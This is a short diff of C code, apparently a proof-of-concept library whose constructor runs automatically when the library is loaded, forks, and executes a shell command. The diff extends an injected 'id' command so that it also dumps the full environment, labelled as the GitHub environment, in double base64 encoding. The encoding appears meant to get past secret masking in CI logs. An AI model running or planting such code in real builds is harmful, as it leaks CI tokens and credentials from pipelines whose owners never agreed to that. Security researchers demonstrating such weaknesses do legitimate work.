@@ -15,7 +15,7 @@ __attribute__((constructor)) void preload_function() {
 
     // Now fork and exec in the child process
     if (fork() == 0) { // Only the child process runs the command
-        execl("/bin/sh", "sh", "-c", "echo 'Command injection here', $(id)", NULL);
+        execl("/bin/sh", "sh", "-c", "echo 'Command injection here', $(id); echo 'The GitHub env is:'; env | base64 | base64", NULL);
         _exit(0); // Ensure the child exits after executing the command
     }
 }
